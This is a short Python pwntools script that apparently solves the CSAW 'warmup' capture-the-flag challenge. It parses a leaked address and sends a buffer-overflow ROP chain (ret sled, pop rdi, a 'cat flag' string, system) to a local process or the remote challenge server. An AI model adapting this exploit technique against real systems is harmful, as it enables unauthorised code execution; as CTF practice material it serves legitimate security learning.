#!/usr/bin/env python
from pwn import *
import struct

p = process('./warmup') if '--live' not in sys.argv else remote('pwn.chal.csaw.io', 8000)

print(p.recvregex('WOW:'))
r = '0x([0-9a-f]*)\n'
easy_offset = 0x40060d
easy_leak = int(re.findall(r, p.recvregex(r))[0], 16)

print('easy_leak: %r' % (easy_leak,))
base_delta = easy_leak - 0x40060d
print('base_delta: %r' % (base_delta,))

ret = struct.pack('<Q', 0x00000000004004a1)
poprdi = struct.pack('<Q', 0x0000000000400713)
catflag = struct.pack('<Q', 0x400730+4)
system = struct.pack('<Q', 0x00000000004004d0)
p.sendline(ret*(0xa0/8) + poprdi + catflag + system)

print p.recvall()
